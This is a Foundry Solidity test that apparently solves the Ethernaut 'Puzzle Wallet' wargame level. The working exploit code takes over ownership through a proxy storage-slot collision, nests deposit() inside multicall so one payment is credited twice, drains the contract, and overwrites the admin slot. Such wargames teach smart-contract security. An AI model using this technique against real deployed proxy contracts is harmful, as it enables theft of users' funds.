// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface ITarget {
  function proposeNewAdmin(address) external;
  function addToWhitelist(address) external;
  function multicall(bytes[] calldata) external payable;
  function execute(address, uint256, bytes memory) external;
  function setMaxBalance(uint256) external;
}

contract PuzzleWalletTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x4dF32584890A0026e56f7535d0f2C6486753624f, 0.001 ether);
  }

  function testExploit() public {
    ITarget target = ITarget(challengeAddress);
    // anybody can call this one
    // will switch slot0 which is pendingAdmin and owner
    target.proposeNewAdmin(address(this));

    // now we can be added to the whitelist (we are the owner)
    target.addToWhitelist(address(this));

    // to win the level
    // - setMaxBalance()
    //   will switch admin/maxBalance to our address
    //   but we need to comply with address(this).balance == 0
    // - execute()
    //   now, this one requires balances[msg.sender] >= value
    // - deposit()
    //   takes the msg.value we send and puts it into the contract
    //   incrementing our value at balance[]
    // - multicall gives you a way to run deposit() twice
    //   transfering to the contract 0.001 ether BUT
    //   crediting your balance[] as 0.002
    //   its flaw is that its control, depositCalled
    //     won't detect if you are calling the function
    //     from multicall() itself
    bytes memory depositCalldata = abi.encodeWithSignature("deposit()");

    bytes[] memory params = new bytes[](1);
    params[0] = depositCalldata;
    bytes memory multicallCallData = abi.encodeWithSignature("multicall(bytes[])", params);

    bytes[] memory multicallInput = new bytes[](2);
    multicallInput[0] = depositCalldata;
    multicallInput[1] = multicallCallData;

    target.multicall{value: 0.001 ether}(multicallInput);

    // as our balance[] is 0.002, we can call execute(), draining the contract
    bytes memory b;
    target.execute(0x0000000000000000000000000000000000000000, 0.002 ether, b);

    // and now we can modify slot1 which is admin/maxBalance
    target.setMaxBalance(uint160(address(this)));

    utils.submitLevelInstance(challengeAddress);
  }
}
